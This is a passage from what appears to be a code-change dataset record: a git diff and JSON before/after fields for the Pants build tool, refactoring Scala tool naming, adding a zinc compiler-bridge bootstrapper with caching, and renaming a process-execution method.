a/src/python/pants/backend/jvm/subsystems/scala_platform.py\n+++ b/src/python/pants/backend/jvm/subsystems/scala_platform.py\n@@ -41,21 +41,21 @@ class ScalaPlatform(JvmToolMixin, ZincLanguageMixin, InjectablesMixin, Subsystem\n   options_scope = 'scala'\n \n   @classmethod\n-  def _create_jardep(cls, name, version):\n+  def create_jardep(cls, name, version):\n     return JarDependency(org='org.scala-lang',\n                          name=name,\n                          rev=scala_build_info[version].full_version)\n \n   @classmethod\n   def _create_runtime_jardep(cls, version):\n-    return cls._create_jardep('scala-library', version)\n+    return cls.create_jardep('scala-library', version)\n \n   @classmethod\n   def _create_compiler_jardep(cls, version):\n-    return cls._create_jardep('scala-compiler', version)\n+    return cls.create_jardep('scala-compiler', version)\n \n   @classmethod\n-  def _key_for_tool_version(cls, tool, version):\n+  def versioned_tool_name(cls, tool, version):\n     if version == 'custom':\n       return tool\n     else:\n@@ -65,7 +65,7 @@ def _key_for_tool_version(cls, tool, version):\n   def register_options(cls, register):\n     def register_scala_compiler_tool(version):\n       cls.register_jvm_tool(register,\n-                            cls._key_for_tool_version('scalac', version),\n+                            cls.versioned_tool_name('scalac', version),\n                             classpath=[cls._create_compiler_jardep(version)])\n \n     def register_scala_repl_tool(version, with_jline=False):\n@@ -78,12 +78,12 @@ def register_scala_repl_tool(version, with_jline=False):\n         )\n         classpath.append(jline_dep)\n       cls.register_jvm_tool(register,\n-                            cls._key_for_tool_version('scala-repl', version),\n+                            cls.versioned_tool_name('scala-repl', version),\n                             classpath=classpath)\n \n     def register_style_tool(version):\n       cls.register_jvm_tool(register,\n-                            cls._key_for_tool_version('scalastyle', version),\n+                            cls.versioned_tool_name('scalastyle', version),\n                             classpath=[scala_style_jar])\n \n     super(ScalaPlatform, cls).register_options(register)\n@@ -126,7 +126,7 @@ def register_style_tool(version):\n     # fail with a useful error, hence the dummy jardep with rev=None.\n     def register_custom_tool(key):\n       dummy_jardep = JarDependency('missing spec', ' //:{}'.format(key))\n-      cls.register_jvm_tool(register, cls._key_for_tool_version(key, 'custom'),\n+      cls.register_jvm_tool(register, cls.versioned_tool_name(key, 'custom'),\n                             classpath=[dummy_jardep])\n     register_custom_tool('scalac')\n     register_custom_tool('scala-repl')\n@@ -135,7 +135,7 @@ def register_custom_tool(key):\n   def _tool_classpath(self, tool, products):\n     \"\"\"Return the proper classpath based on products and scala version.\"\"\"\n     return self.tool_classpath_from_products(products,\n-                                             self._key_for_tool_version(tool, self.version),\n+                                             self.versioned_tool_name(tool, self.version),\n                                              scope=self.options_scope)\n \n   def compiler_classpath(self, products):\n@@ -172,7 +172,7 @@ def suffix_version(self, name):\n   @property\n   def repl(self):\n     \"\"\"Return the repl tool key.\"\"\"\n-    return self._key_for_tool_version('scala-repl', self.version)\n+    return self.versioned_tool_name('scala-repl', self.version)\n \n   def injectables(self, build_graph):\n     if self.version == 'custom':\ndiff --git a/src/python/pants/backend/jvm/subsystems/zinc.py b/src/python/pants/backend/jvm/subsystems/zinc.py\nindex 956855839..1a28110af 100644\n--- a/src/python/pants/backend/jvm/subsystems/zinc.py\n+++ b/src/python/pants/backend/jvm/subsystems/zinc.py\n@@ -4,7 +4,11 @@\n \n from __future__ import absolute_import, division, print_function, unicode_literals\n \n+import os\n from builtins import object\n+from hashlib import sha1\n+\n+from future.utils import text_type\n \n from pants.backend.jvm.subsystems.dependency_context import DependencyContext\n from pants.backend.jvm.subsystems.java import Java\n@@ -15,10 +19,13 @@\n from pants.backend.jvm.tasks.classpath_products import ClasspathEntry\n from pants.backend.jvm.tasks.classpath_util import ClasspathUtil\n from pants.base.build_environment import get_buildroot\n-from pants.engine.fs import PathGlobs, PathGlobsAndRoot\n+from pants.base.workunit import WorkUnitLabel\n+from pants.engine.fs import DirectoryToMaterialize, PathGlobs, PathGlobsAndRoot\n+from pants.engine.isolated_process import ExecuteProcessRequest\n from pants.java.jar.jar_dependency import JarDependency\n from pants.subsystem.subsystem import Subsystem\n-from pants.util.dirutil import fast_relpath\n+from pants.util.dirutil import fast_relpath, safe_mkdir\n+from pants.util.fileutil import safe_hardlink_or_copy\n from pants.util.memo import memoized_method, memoized_property\n \n \n@@ -26,10 +33,12 @@ class Zinc(object):\n   \"\"\"Configuration for Pants' zinc wrapper tool.\"\"\"\n \n   ZINC_COMPILE_MAIN = 'org.pantsbuild.zinc.compiler.Main'\n+  ZINC_BOOTSTRAPER_MAIN = 'org.pantsbuild.zinc.bootstrapper.Main'\n   ZINC_EXTRACT_MAIN = 'org.pantsbuild.zinc.extractor.Main'\n   DEFAULT_CONFS = ['default']\n \n   ZINC_COMPILER_TOOL_NAME = 'zinc'\n+  ZINC_BOOTSTRAPPER_TOOL_NAME = 'zinc-bootstrapper'\n   ZINC_EXTRACTOR_TOOL_NAME = 'zinc-extractor'\n \n   class Factory(Subsystem, JvmToolMixin):\n@@ -59,10 +68,19 @@ def register_options(cls, register):\n           Shader.exclude_package('org.apache.logging.log4j', recursive=True),\n         ]\n \n+      cls.register_jvm_tool(register,\n+                            Zinc.ZINC_BOOTSTRAPPER_TOOL_NAME,\n+                            classpath=[\n+                              JarDependency('org.pantsbuild', 'zinc-bootstrapper_2.11', '0.0.3'),\n+                            ],\n+                            main=Zinc.ZINC_BOOTSTRAPER_MAIN,\n+                            custom_rules=shader_rules,\n+                          )\n+\n       cls.register_jvm_tool(register,\n                             Zinc.ZINC_COMPILER_TOOL_NAME,\n                             classpath=[\n-                              JarDependency('org.pantsbuild', 'zinc-compiler_2.11', '0.0.7'),\n+                              JarDependency('org.pantsbuild', 'zinc-compiler_2.11', '0.0.8'),\n                             ],\n                             main=Zinc.ZINC_COMPILE_MAIN,\n                             custom_rules=shader_rules)\n@@ -76,6 +94,7 @@ def register_options(cls, register):\n                                                 classifier='sources',\n                                                 intransitive=True),\n                             ])\n+\n       cls.register_jvm_tool(register,\n                             'compiler-interface',\n                             classpath=[\n@@ -92,9 +111,27 @@ def register_options(cls, register):\n       cls.register_jvm_tool(register,\n                             Zinc.ZINC_EXTRACTOR_TOOL_NAME,\n                             classpath=[\n-                              JarDependency('org.pantsbuild', 'zinc-extractor_2.11', '0.0.4')\n+                              JarDependency('org.pantsbuild', 'zinc-extractor_2.11', '0.0.6')\n                             ])\n \n+      # Register scalac for fixed versions of Scala, 2.10, 2.11 and 2.12.\n+      # Relies on ScalaPlatform to get the revision version from the major.minor version.\n+      # The tool with the correct scala version will be retrieved later,\n+      # taking the user-passed option into account.\n+      supported_scala_versions=['2.10', '2.11', '2.12']\n+      wanted_jars = ['scala-compiler', 'scala-library', 'scala-reflect']\n+      for scala_version in supported_scala_versions:\n+        cls.register_jvm_tool(register,\n+                              ScalaPlatform.versioned_tool_name('scalac', scala_version),\n+                              classpath=[\n+                                ScalaPlatform.create_jardep(jar, scala_version) for jar in wanted_jars\n+                              ])\n+\n+      # Register custom scalac tool.\n+      cls.register_jvm_tool(register,\n+                            ScalaPlatform.versioned_tool_name('scalac', 'custom'),\n+                            classpath=[JarDependency('missing spec', ' //:scalac')])\n+\n     @classmethod\n     def _zinc(cls, products):\n       return cls.tool_jar_from_products(products, Zinc.ZINC_COMPILER_TOOL_NAME, cls.options_scope)\n@@ -107,6 +144,30 @@ def _compiler_bridge(cls, products):\n     def _compiler_interface(cls, products):\n       return cls.tool_jar_from_products(products, 'compiler-interface', cls.options_scope)\n \n+    @classmethod\n+    def _compiler_bootstrapper(cls, products):\n+      return cls.tool_jar_from_products(products, Zinc.ZINC_BOOTSTRAPPER_TOOL_NAME, cls.options_scope)\n+\n+    # Retrieves the path of a tool's jar\n+    # by looking at the classpath of the registered tool with the user-specified scala version.\n+    def _fetch_tool_jar_from_scalac_classpath(self, products, jar_name):\n+      scala_version = ScalaPlatform.global_instance().version\n+      classpath = self.tool_classpath_from_products(products,\n+                                                    ScalaPlatform.versioned_tool_name('scalac', scala_version),\n+                                                    scope=self.options_scope)\n+      candidates = [jar for jar in classpath if jar_name in jar]\n+      assert(len(candidates) == 1)\n+      return candidates[0]\n+\n+    def _scala_compiler(self, products):\n+      return self._fetch_tool_jar_from_scalac_classpath(products, 'scala-compiler')\n+\n+    def _scala_library(self, products):\n+      return self._fetch_tool_jar_from_scalac_classpath(products, 'scala-library')\n+\n+    def _scala_reflect(self, products):\n+      return self._fetch_tool_jar_from_scalac_classpath(products, 'scala-reflect')\n+\n     def create(self, products):\n       \"\"\"Create a Zinc instance from products active in the current Pants run.\n \n@@ -153,6 +214,125 @@ def compiler_interface(self):\n     \"\"\"\n     return self._zinc_factory._compiler_interface(self._products)\n \n+  @memoized_property\n+  def scala_compiler(self):\n+    \"\"\"Return the path to the scala compiler jar.\n+\n+    :rtype: str\n+    \"\"\"\n+    return self._zinc_factory._scala_compiler(self._products)\n+\n+  @memoized_property\n+  def scala_library(self):\n+    \"\"\"Return the path to the scala library jar (runtime).\n+\n+    :rtype: str\n+    \"\"\"\n+    return self._zinc_factory._scala_library(self._products)\n+\n+  @memoized_property\n+  def scala_reflect(self):\n+    \"\"\"Return the path to the scala library jar (runtime).\n+\n+    :rtype: str\n+    \"\"\"\n+    return self._zinc_factory._scala_reflect(self._products)\n+\n+  def _workdir(self):\n+    return self._zinc_factory.get_options().pants_workdir\n+\n+  @memoized_property\n+  def _compiler_bridge_cache_dir(self):\n+    \"\"\"A directory where we can store compiled copies of the `compiler-bridge`.\n+\n+    The compiler-bridge is specific to each scala version.\n+    Currently we compile the `compiler-bridge` only once, while bootstrapping.\n+    Then, we store it in the working directory under .pants.d/zinc/<cachekey>, where\n+    <cachekey> is calculated using the locations of zinc, the compiler interface,\n+    and the compiler bridge.\n+    \"\"\"\n+    hasher = sha1()\n+    for cp_entry in [self.zinc, self.compiler_interface, self.compiler_bridge]:\n+      hasher.update(os.path.relpath(cp_entry, self._workdir()))\n+    key = hasher.hexdigest()[:12]\n+\n+    return os.path.join(self._workdir(), 'zinc', 'compiler-bridge', key)\n+\n+  def _relative_to_buildroot(self, path):\n+    \"\"\"A utility function to create relative paths to the work dir\"\"\"\n+    return fast_relpath(path, get_buildroot())\n+\n+  def _run_bootstrapper(self, bridge_jar, context):\n+    bootstrapper = self._zinc_factory._compiler_bootstrapper(self._products)\n+    bootstrapper_args = [\n+      '--out', bridge_jar,\n+      '--compiler-interface', self.compiler_interface,\n+      '--compiler-bridge-src', self.compiler_bridge,\n+      '--scala-compiler', self.scala_compiler,\n+      '--scala-library', self.scala_library,\n+      '--scala-reflect', self.scala_reflect,\n+    ]\n+    input_jar_snapshots = context._scheduler.capture_snapshots((PathGlobsAndRoot(\n+      PathGlobs(tuple([self._relative_to_buildroot(jar) for jar in bootstrapper_args[1::2]])),\n+      text_type(get_buildroot())\n+    ),))\n+    argv = tuple(['.jdk/bin/java'] +\n+                 ['-cp', bootstrapper, Zinc.ZINC_BOOTSTRAPER_MAIN] +\n+                 bootstrapper_args\n+    )\n+    req = ExecuteProcessRequest(\n+      argv=argv,\n+      input_files=input_jar_snapshots[0].directory_digest,\n+      output_files=(self._relative_to_buildroot(bridge_jar),),\n+      output_directories=(self._relative_to_buildroot(self._compiler_bridge_cache_dir),),\n+      description='bootstrap compiler bridge.',\n+      jdk_home=self.dist.home,\n+    )\n+    return context.execute_process_synchronously_or_raise(req, 'zinc-subsystem', [WorkUnitLabel.COMPILER])\n+\n+  @memoized_method\n+  def compile_compiler_bridge(self, context):\n+    \"\"\"Compile the compiler bridge to be used by zinc, using our scala bootstrapper.\n+    It will compile and cache the jar, and materialize it if not already there.\n+\n+    :param context: The context of the task trying to compile the bridge.\n+                    This is mostly needed to use its scheduler to create digests of the relevant jars.\n+    :return: The absolute path to the compiled scala-compiler-bridge jar.\n+    \"\"\"\n+    bridge_jar_name = 'scala-compiler-bridge.jar'\n+    bridge_jar = os.path.join(self._compiler_bridge_cache_dir, bridge_jar_name)\n+    global_bridge_cache_dir = os.path.join(self._zinc_factory.get_options().pants_bootstrapdir, fast_relpath(self._compiler_bridge_cache_dir,  self._workdir()))\n+    globally_cached_bridge_jar = os.path.join(global_bridge_cache_dir, bridge_jar_name)\n+\n+    # Workaround to avoid recompiling the bridge for every integration test\n+    # We check the bootstrapdir (.cache) for the bridge.\n+    # If it exists, we make a copy to the buildroot.\n+    #\n+    # TODO Remove when action caches are implemented.\n+    if os.path.exists(globally_cached_bridge_jar):\n+      # Cache the bridge jar under buildroot, to allow snapshotting\n+      safe_mkdir(self._relative_to_buildroot(self._compiler_bridge_cache_dir))\n+      safe_hardlink_or_copy(globally_cached_bridge_jar, bridge_jar)\n+\n+    if not os.path.exists(bridge_jar):\n+      res = self._run_bootstrapper(bridge_jar, context)\n+      context._scheduler.materialize_directories((\n+        DirectoryToMaterialize(get_buildroot(), res.output_directory_digest),\n+      ))\n+      # For the workaround above to work, we need to store a copy of the bridge in\n+      # the bootstrapdir cache (.cache).\n+      safe_mkdir(global_bridge_cache_dir)\n+      safe_hardlink_or_copy(bridge_jar, globally_cached_bridge_jar)\n+\n+      return ClasspathEntry(bridge_jar, res.output_directory_digest)\n+    else:\n+      bridge_jar_snapshot = context._scheduler.capture_snapshots((PathGlobsAndRoot(\n+        PathGlobs((self._relative_to_buildroot(bridge_jar),)),\n+        text_type(get_buildroot())\n+      ),))[0]\n+      bridge_jar_digest = bridge_jar_snapshot.directory_digest\n+      return ClasspathEntry(bridge_jar, bridge_jar_digest)\n+\n   @memoized_method\n   def snapshot(self, scheduler):\n     buildroot = get_buildroot()\n@@ -161,7 +341,7 @@ def snapshot(self, scheduler):\n         PathGlobs(\n           tuple(\n             fast_relpath(a, buildroot)\n-            for a in (self.zinc, self.compiler_bridge, self.compiler_interface)\n+              for a in (self.zinc, self.compiler_bridge, self.compiler_interface)\n           )\n         ),\n         buildroot,\n@@ -228,5 +408,5 @@ def compile_classpath(self, classpath_product_key, target, extra_cp_entries=None\n     \"\"\"Compute the compile classpath for the given target.\"\"\"\n     return list(\n       entry.path\n-      for entry in self.compile_classpath_entries(classpath_product_key, target, extra_cp_entries)\n+        for entry in self.compile_classpath_entries(classpath_product_key, target, extra_cp_entries)\n     )\ndiff --git a/src/python/pants/backend/jvm/tasks/jvm_compile/javac/javac_compile.py b/src/python/pants/backend/jvm/tasks/jvm_compile/javac/javac_compile.py\nindex 5cf94f36f..0b5ec1b06 100644\n--- a/src/python/pants/backend/jvm/tasks/jvm_compile/javac/javac_compile.py\n+++ b/src/python/pants/backend/jvm/tasks/jvm_compile/javac/javac_compile.py\n@@ -222,7 +222,7 @@ def _execute_hermetic_compile(self, cmd, ctx):\n       output_files=output_files,\n       description='Compiling {} with javac'.format(ctx.target.address.spec),\n     )\n-    exec_result = self.context.execute_process_synchronously(\n+    exec_result = self.context.execute_process_synchronously_without_raising(\n       exec_process_request,\n       'javac',\n       (WorkUnitLabel.TASK, WorkUnitLabel.JVM),\ndiff --git a/src/python/pants/backend/jvm/tasks/jvm_compile/zinc/zinc_compile.py b/src/python/pants/backend/jvm/tasks/jvm_compile/zinc/zinc_compile.py\nindex 0d4fcdff6..fa10bb1ec 100644\n--- a/src/python/pants/backend/jvm/tasks/jvm_compile/zinc/zinc_compile.py\n+++ b/src/python/pants/backend/jvm/tasks/jvm_compile/zinc/zinc_compile.py\n@@ -12,7 +12,6 @@\n from builtins import open\n from collections import defaultdict\n from contextlib import closing\n-from hashlib import sha1\n from xml.etree import ElementTree\n \n from future.utils import PY3, text_type\n@@ -281,20 +280,6 @@ def _write_processor_info(self, processor_info_file, processors):\n       for processor in processors:\n         f.write('{}\\n'.format(processor.strip()))\n \n-  @memoized_property\n-  def _zinc_cache_dir(self):\n-    \"\"\"A directory where zinc can store compiled copies of the `compiler-bridge`.\n-\n-    The compiler-bridge is specific to each scala version, and is lazily computed by zinc if the\n-    appropriate version does not exist. Eventually it would be great to just fetch this rather\n-    than compiling it.\n-    \"\"\"\n-    hasher = sha1()\n-    for cp_entry in [self._zinc.zinc, self._zinc.compiler_interface, self._zinc.compiler_bridge]:\n-      hasher.update(os.path.relpath(cp_entry, self.get_options().pants_workdir))\n-    key = hasher.hexdigest()[:12]\n-    return os.path.join(self.get_options().pants_bootstrapdir, 'zinc', key)\n-\n   def compile(self, ctx, args, dependency_classpath, upstream_analysis,\n               settings, compiler_option_sets, zinc_file_manager,\n               javac_plugin_map, scalac_plugin_map):\n@@ -315,14 +300,10 @@ def relative_to_exec_root(path):\n       return fast_relpath(path, get_buildroot())\n \n     scala_path = self.scalac_classpath()\n-    compiler_interface = self._zinc.compiler_interface\n-    compiler_bridge = self._zinc.compiler_bridge\n     classes_dir = ctx.classes_dir\n     analysis_cache = ctx.analysis_file\n \n     scala_path = tuple(relative_to_exec_root(c) for c in scala_path)\n-    compiler_interface = relative_to_exec_root(compiler_interface)\n-    compiler_bridge = relative_to_exec_root(compiler_bridge)\n     analysis_cache = relative_to_exec_root(analysis_cache)\n     classes_dir = relative_to_exec_root(classes_dir)\n     # TODO: Have these produced correctly, rather than having to relativize them here\n@@ -338,11 +319,8 @@ def relative_to_exec_root(path):\n     if not self.get_options().colors:\n       zinc_args.append('-no-color')\n \n-    zinc_args.extend(['-compiler-interface', compiler_interface])\n-    zinc_args.extend(['-compiler-bridge', compiler_bridge])\n-    # TODO: Kill zinc-cache-dir: https://github.com/pantsbuild/pants/issues/6155\n-    # But for now, this will probably fail remotely because the homedir probably doesn't exist.\n-    zinc_args.extend(['-zinc-cache-dir', self._zinc_cache_dir])\n+    compiler_bridge_classpath_entry = self._zinc.compile_compiler_bridge(self.context)\n+    zinc_args.extend(['-compiled-bridge-jar', compiler_bridge_classpath_entry.path])\n     zinc_args.extend(['-scala-path', ':'.join(scala_path)])\n \n     zinc_args.extend(self._javac_plugin_args(javac_plugin_map))\n@@ -421,11 +399,12 @@ def relative_to_exec_root(path):\n         ctx.target.sources_snapshot(self.context._scheduler),\n       ]\n \n+      relevant_classpath_entries = dependency_classpath + [compiler_bridge_classpath_entry]\n       directory_digests = tuple(\n-        entry.directory_digest for entry in dependency_classpath if entry.directory_digest\n+        entry.directory_digest for entry in relevant_classpath_entries if entry.directory_digest\n       )\n-      if len(directory_digests) != len(dependency_classpath):\n-        for dep in dependency_classpath:\n+      if len(directory_digests) != len(relevant_classpath_entries):\n+        for dep in relevant_classpath_entries:\n           if dep.directory_digest is None:\n             logger.warning(\n               \"ClasspathEntry {} didn't have a DirectoryDigest, so won't be present for hermetic \"\n@@ -458,7 +437,7 @@ def relative_to_exec_root(path):\n         # TODO: These should always be unicodes\n         jdk_home=text_type(self._zinc.dist.home),\n       )\n-      res = self.context.execute_process_synchronously(req, self.name(), [WorkUnitLabel.COMPILER])\n+      res = self.context.execute_process_synchronously_without_raising(req, self.name(), [WorkUnitLabel.COMPILER])\n       # TODO: Materialize as a batch in do_compile or somewhere\n       self.context._scheduler.materialize_directories((\n         DirectoryToMaterialize(get_buildroot(), res.output_directory_digest),\ndiff --git a/src/python/pants/goal/context.py b/src/python/pants/goal/context.py\nindex 8ecb9b495..ab11a68f2 100644\n--- a/src/python/pants/goal/context.py\n+++ b/src/python/pants/goal/context.py\n@@ -16,7 +16,8 @@\n from pants.base.worker_pool import SubprocPool\n from pants.base.workunit import WorkUnit, WorkUnitLabel\n from pants.build_graph.target import Target\n-from pants.engine.isolated_process import FallibleExecuteProcessResult\n+from pants.engine.isolated_process import (FallibleExecuteProcessResult,\n+                                           fallible_to_exec_result_or_raise)\n from pants.goal.products import Products\n from pants.goal.workspace import ScmWorkspace\n from pants.process.lock import OwnerPrintingInterProcessFileLock\n@@ -379,7 +380,7 @@ def scan(self, root=None):\n       build_graph.inject_address_closure(address)\n     return build_graph\n \n-  def execute_process_synchronously(self, execute_process_request, name, labels=None):\n+  def execute_process_synchronously_without_raising(self, execute_process_request, name, labels=None):\n     \"\"\"Executes a process (possibly remotely), and returns information about its output.\n \n     :param execute_process_request: The ExecuteProcessRequest to run.\n@@ -399,3 +400,14 @@ def execute_process_synchronously(self, execute_process_request, name, labels=No\n       workunit.output(\"stderr\").write(result.stderr)\n       workunit.set_outcome(WorkUnit.FAILURE if result.exit_code else WorkUnit.SUCCESS)\n       return result\n+\n+  def execute_process_synchronously_or_raise(self, execute_process_request, name, labels=None):\n+    \"\"\"Execute process synchronously, and throw if the return code is not 0.\n+\n+    See execute_process_synchronously for the api docs.\n+    \"\"\"\n+    fallible_result = self.execute_process_synchronously_without_raising(execute_process_request, name, labels)\n+    return fallible_to_exec_result_or_raise(\n+      fallible_result,\n+      execute_process_request\n+    )\ndiff --git a/src/python/pants/java/distribution/distribution.py b/src/python/pants/java/distribution/distribution.py\nindex 050f78fd3..f9073efe3 100644\n--- a/src/python/pants/java/distribution/distribution.py\n+++ b/src/python/pants/java/distribution/distribution.py\n@@ -14,7 +14,7 @@\n from collections import namedtuple\n from contextlib import contextmanager\n \n-from future.utils import PY3\n+from future.utils import PY3, text_type\n from six import string_types\n \n from pants.base.revision import Revision\n@@ -154,7 +154,7 @@ def home(self):\n         if self._is_executable(os.path.join(jdk_dir, 'bin', 'javac')):\n           home = jdk_dir\n       self._home = home\n-    return self._home\n+    return text_type(self._home)\n \n   @property\n   def real_home(self):\n", "message": "", "files": {"/src/python/pants/backend/graph_info/tasks/cloc.py": {"changes": [{"diff": "\n       output_files=('ignored', 'report'),\n       description='cloc',\n     )\n-    exec_result = self.context.execute_process_synchronously(req, 'cloc', (WorkUnitLabel.TOOL,))\n+    exec_result = self.context.execute_process_synchronously_without_raising(req, 'cloc', (WorkUnitLabel.TOOL,))\n \n     files_content_tuple = self.context._scheduler.product_request(\n       FilesContent,", "add": 1, "remove": 1, "filename": "/src/python/pants/backend/graph_info/tasks/cloc.py", "badparts": ["    exec_result = self.context.execute_process_synchronously(req, 'cloc', (WorkUnitLabel.TOOL,))"], "goodparts": ["    exec_result = self.context.execute_process_synchronously_without_raising(req, 'cloc', (WorkUnitLabel.TOOL,))"]}], "source": "\n from __future__ import absolute_import, division, print_function, unicode_literals import os from builtins import open from future.utils import text_type from pants.backend.graph_info.subsystems.cloc_binary import ClocBinary from pants.base.workunit import WorkUnitLabel from pants.engine.fs import FilesContent, PathGlobs, PathGlobsAndRoot from pants.engine.isolated_process import ExecuteProcessRequest from pants.task.console_task import ConsoleTask from pants.util.contextutil import temporary_dir class CountLinesOfCode(ConsoleTask): \"\"\"Print counts of lines of code.\"\"\" @classmethod def subsystem_dependencies(cls): return super(CountLinesOfCode, cls).subsystem_dependencies() +(ClocBinary,) @classmethod def register_options(cls, register): super(CountLinesOfCode, cls).register_options(register) register('--transitive', type=bool, fingerprint=True, default=True, help='Operate on the transitive dependencies of the specified targets. ' 'Unset to operate only on the specified targets.') register('--ignored', type=bool, fingerprint=True, help='Show information about files ignored by cloc.') def console_output(self, targets): if not self.get_options().transitive: targets=self.context.target_roots input_snapshots=tuple( target.sources_snapshot(scheduler=self.context._scheduler) for target in targets ) input_files={f.path for snapshot in input_snapshots for f in snapshot.files} with temporary_dir() as tmpdir: list_file=os.path.join(tmpdir, 'input_files_list') with open(list_file, 'w') as list_file_out: for input_file in sorted(input_files): list_file_out.write(input_file) list_file_out.write('\\n') list_file_snapshot=self.context._scheduler.capture_snapshots(( PathGlobsAndRoot( PathGlobs(('input_files_list',)), text_type(tmpdir), ), ))[0] cloc_path, cloc_snapshot=ClocBinary.global_instance().hackily_snapshot(self.context) directory_digest=self.context._scheduler.merge_directories(tuple(s.directory_digest for s in input_snapshots +( cloc_snapshot, list_file_snapshot, ))) cmd=( '/usr/bin/perl', cloc_path, '--skip-uniqueness', '--ignored=ignored', '--list-file=input_files_list', '--report-file=report', ) req=ExecuteProcessRequest( argv=cmd, input_files=directory_digest, output_files=('ignored', 'report'), description='cloc', ) exec_result=self.context.execute_process_synchronously(req, 'cloc',(WorkUnitLabel.TOOL,)) files_content_tuple=self.context._scheduler.product_request( FilesContent, [exec_result.output_directory_digest] )[0].dependencies files_content={fc.path: fc.content.decode('utf-8') for fc in files_content_tuple} for line in files_content['report'].split('\\n'): yield line if self.get_options().ignored: yield 'Ignored the following files:' for line in files_content['ignored'].split('\\n'): yield line ", "sourceWithComments": "# coding=utf-8\n# Copyright 2015 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nimport os\nfrom builtins import open\n\nfrom future.utils import text_type\n\nfrom pants.backend.graph_info.subsystems.cloc_binary import ClocBinary\nfrom pants.base.workunit import WorkUnitLabel\nfrom pants.engine.fs import FilesContent, PathGlobs, PathGlobsAndRoot\nfrom pants.engine.isolated_process import ExecuteProcessRequest\nfrom pants.task.console_task import ConsoleTask\nfrom pants.util.contextutil import temporary_dir\n\n\nclass CountLinesOfCode(ConsoleTask):\n  \"\"\"Print counts of lines of code.\"\"\"\n\n  @classmethod\n  def subsystem_dependencies(cls):\n    return super(CountLinesOfCode, cls).subsystem_dependencies() + (ClocBinary,)\n\n  @classmethod\n  def register_options(cls, register):\n    super(CountLinesOfCode, cls).register_options(register)\n    register('--transitive', type=bool, fingerprint=True, default=True,\n             help='Operate on the transitive dependencies of the specified targets.  '\n                  'Unset to operate only on the specified targets.')\n    register('--ignored', type=bool, fingerprint=True,\n             help='Show information about files ignored by cloc.')\n\n  def console_output(self, targets):\n    if not self.get_options().transitive:\n      targets = self.context.target_roots\n\n    input_snapshots = tuple(\n      target.sources_snapshot(scheduler=self.context._scheduler) for target in targets\n    )\n    input_files = {f.path for snapshot in input_snapshots for f in snapshot.files}\n\n    # TODO: Work out a nice library-like utility for writing an argfile, as this will be common.\n    with temporary_dir() as tmpdir:\n      list_file = os.path.join(tmpdir, 'input_files_list')\n      with open(list_file, 'w') as list_file_out:\n        for input_file in sorted(input_files):\n          list_file_out.write(input_file)\n          list_file_out.write('\\n')\n      list_file_snapshot = self.context._scheduler.capture_snapshots((\n        PathGlobsAndRoot(\n          PathGlobs(('input_files_list',)),\n          text_type(tmpdir),\n        ),\n      ))[0]\n\n    cloc_path, cloc_snapshot = ClocBinary.global_instance().hackily_snapshot(self.context)\n\n    directory_digest = self.context._scheduler.merge_directories(tuple(s.directory_digest for s in\n      input_snapshots + (\n      cloc_snapshot,\n      list_file_snapshot,\n    )))\n\n    cmd = (\n      '/usr/bin/perl',\n      cloc_path,\n      '--skip-uniqueness',\n      '--ignored=ignored',\n      '--list-file=input_files_list',\n      '--report-file=report',\n    )\n\n    # The cloc script reaches into $PATH to look up perl. Let's assume it's in /usr/bin.\n    req = ExecuteProcessRequest(\n      argv=cmd,\n      input_files=directory_digest,\n      output_files=('ignored', 'report'),\n      description='cloc',\n    )\n    exec_result = self.context.execute_process_synchronously(req, 'cloc', (WorkUnitLabel.TOOL,))\n\n    files_content_tuple = self.context._scheduler.product_request(\n      FilesContent,\n      [exec_result.output_directory_digest]\n    )[0].dependencies\n\n    files_content = {fc.path: fc.content.decode('utf-8') for fc in files_content_tuple}\n    for line in files_content['report'].split('\\n'):\n      yield line\n\n    if self.get_options().ignored:\n      yield 'Ignored the following files:'\n      for line in files_content['ignored'].split('\\n'):\n        yield line\n"}, "/src/python/pants/backend/jvm/subsystems/scala_platform.py": {"changes": [{"diff": "\n   options_scope = 'scala'\n \n   @classmethod\n-  def _create_jardep(cls, name, version):\n+  def create_jardep(cls, name, version):\n     return JarDependency(org='org.scala-lang',\n                          name=name,\n                          rev=scala_build_info[version].full_version)\n \n   @classmethod\n   def _create_runtime_jardep(cls, version):\n-    return cls._create_jardep('scala-library', version)\n+    return cls.create_jardep('scala-library', version)\n \n   @classmethod\n   def _create_compiler_jardep(cls, version):\n-    return cls._create_jardep('scala-compiler', version)\n+    return cls.create_jardep('scala-compiler', version)\n \n   @classmethod\n-  def _key_for_tool_version(cls, tool, version):\n+  def versioned_tool_name(cls, tool, version):\n     if version == 'custom':\n       return tool\n     else:\n", "add": 4, "remove": 4, "filename": "/src/python/pants/backend/jvm/subsystems/scala_platform.py", "badparts": ["  def _create_jardep(cls, name, version):", "    return cls._create_jardep('scala-library', version)", "    return cls._create_jardep('scala-compiler', version)", "  def _key_for_tool_version(cls, tool, version):"], "goodparts": ["  def create_jardep(cls, name, version):", "    return cls.create_jardep('scala-library', version)", "    return cls.create_jardep('scala-compiler', version)", "  def versioned_tool_name(cls, tool, version):"]}, {"diff": "\n   def register_options(cls, register):\n     def register_scala_compiler_tool(version):\n       cls.register_jvm_tool(register,\n-                            cls._key_for_tool_version('scalac', version),\n+                            cls.versioned_tool_name('scalac', version),\n                             classpath=[cls._create_compiler_jardep(version)])\n \n     def register_scala_repl_tool(version, with_jline=False):\n", "add": 1, "remove": 1, "filename": "/src/python/pants/backend/jvm/subsystems/scala_platform.py", "badparts": ["                            cls._key_for_tool_version('scalac', version),"], "goodparts": ["                            cls.versioned_tool_name('scalac', version),"]}, {"diff": "\n         )\n         classpath.append(jline_dep)\n       cls.register_jvm_tool(register,\n-                            cls._key_for_tool_version('scala-repl', version),\n+                            cls.versioned_tool_name('scala-repl', version),\n                             classpath=classpath)\n \n     def register_style_tool(version):\n       cls.register_jvm_tool(register,\n-                            cls._key_for_tool_version('scalastyle', version),\n+                            cls.versioned_tool_name('scalastyle', version),\n                             classpath=[scala_style_jar])\n \n     super(ScalaPlatform, cls).register_options(register)\n", "add": 2, "remove": 2, "filename": "/src/python/pants/backend/jvm/subsystems/scala_platform.py", "badparts": ["                            cls._key_for_tool_version('scala-repl', version),", "                            cls._key_for_tool_version('scalastyle', version),"], "goodparts": ["                            cls.versioned_tool_name('scala-repl', version),", "                            cls.versioned_tool_name('scalastyle', version),"]}, {"diff": "\n     # fail with a useful error, hence the dummy jardep with rev=None.\n     def register_custom_tool(key):\n       dummy_jardep = JarDependency('missing spec', ' //:{}'.format(key))\n-      